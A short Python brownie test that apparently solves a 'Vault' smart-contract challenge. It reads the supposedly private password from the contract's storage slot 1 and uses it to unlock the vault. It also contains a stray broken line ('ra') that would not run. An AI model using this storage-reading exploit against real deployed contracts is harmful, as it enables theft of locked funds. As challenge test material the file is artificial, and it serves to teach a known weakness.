import random
import string

import brownie
from hexbytes import HexBytes


def deploy_vault(password: str):
    password = brownie.web3.toHex(text=password)
    return brownie.Vault.deploy(password, {"from": brownie.accounts[0]})


def test_attack():
    password_len = 10
    random_password = "".join(
        random.SystemRandom().choice(string.ascii_letters + string.digits)
        for _ in range(password_len)
    )

    vault = deploy_vault(random_password)

    password_content: HexBytes = brownie.network.web3.eth.get_storage_at(
        vault.address, 1
    )

    password = brownie.network.web3.toText(hexstr=password_content.hex())
    ra
    assert password[-password_len:] == random_password
    assert vault.locked() is True

    tx = vault.unlock(brownie.web3.toHex(text=password))
    tx.wait(1)

    assert vault.locked() is False
